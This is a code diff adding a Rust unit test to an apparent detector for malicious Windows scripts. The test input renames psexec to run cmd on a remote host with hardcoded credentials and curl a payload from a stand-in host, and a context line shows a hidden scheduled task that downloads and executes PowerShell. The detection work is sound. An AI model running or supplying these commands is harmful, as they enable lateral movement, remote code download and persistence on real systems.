@@ -3155,6 +3155,42 @@ schtasks /create /tn "Updater" /tr "powershell -w hidden \"IEX(New-Object Net.We
     }
 
     #[test]
+    fn copied_psexec_alias_replays_remote_cmd_child() {
+        let script = br#"copy C:\Windows\System32\psexec.exe C:\Users\Public\ps.tmp
+C:\Users\Public\ps.tmp \\target.example -u admin -p pass cmd.exe /V:ON /c set U=https://copied-psexec.example/payload.exe&&curl -o payload.exe !U!"#;
+        let report = analyze(script, &AnalyzeConfig::default());
+
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                Trait::ManipulatedExec { target, .. }
+                    if target.eq_ignore_ascii_case(r#"C:\Users\Public\ps.tmp"#)
+            )),
+            "copied psexec alias invocation was not tied back to WindowsUtilManip: {:?}",
+            report.traits
+        );
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                Trait::Download { src, dst, .. }
+                    if src == "https://copied-psexec.example/payload.exe"
+                        && dst.as_deref() == Some("payload.exe")
+            )),
+            "copied psexec remote child command was not analyzed: {:?}",
+            report.traits
+        );
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                Trait::LateralMovement { tool, target_host }
+                    if tool == "psexec" && target_host == "target.example"
+            )),
+            "copied psexec lateral movement trait missing: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
     fn winrs_replays_remote_cmd_child() {
         let script = br#"winrs -r:target.example cmd.exe /V:ON /c set U=https://winrs-wrapper.example/payload.exe&&curl -o payload.exe !U!"#;
         let report = analyze(script, &AnalyzeConfig::default());
